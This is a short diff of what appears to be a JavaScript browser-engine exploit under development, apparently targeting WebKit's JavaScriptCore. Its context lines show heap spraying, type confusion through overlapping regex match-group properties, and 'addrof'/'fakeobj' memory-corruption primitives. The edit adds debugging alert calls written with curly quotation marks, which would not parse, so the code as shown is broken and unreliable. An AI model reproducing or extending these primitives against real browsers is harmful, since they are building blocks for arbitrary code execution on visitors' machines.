@@ -1,7 +1,7 @@
 <script src="utils.js"> </script>
 <script>
 //debugger;
-let print = alert;
+//let print = alert;
 //var ALLOCS = 1000
 let convert = new ArrayBuffer(0x8);
 let f64 = new Float64Array(convert);
@@ -43,6 +43,7 @@ for (let i = 0; i < 0x1000; i++) {
     tmp['spray' + i.toString()] = 3.3;
     structs.push(tmp);
 }*/
+alert(“here1”)
 // Create a plain array with indexing type SlowPutArrayStorage. This is equivalent to
 // `arrayStructureForIndexingTypeDuringAllocation(ArrayWithSlowPutArrayStorage)` in C++.
 function createArrayWithSlowPutArrayStorage() {
@@ -110,6 +111,7 @@ match.groups.oolProperty1 = objY;       // This property overlaps with oolProper
 global = match;
 // backup original structure
 let backup = hax(1);
+alert(“here2”)
 var primitives = {
  addrof: function (obj) {
   hax(backup);
@@ -123,7 +125,7 @@ fakeobj: function (addr) {
     hax(backup);
   return victim5[0];
 },};
-
+alert(“here3”)
 //let stage1 = primitives;
 /*
 var structs = [];
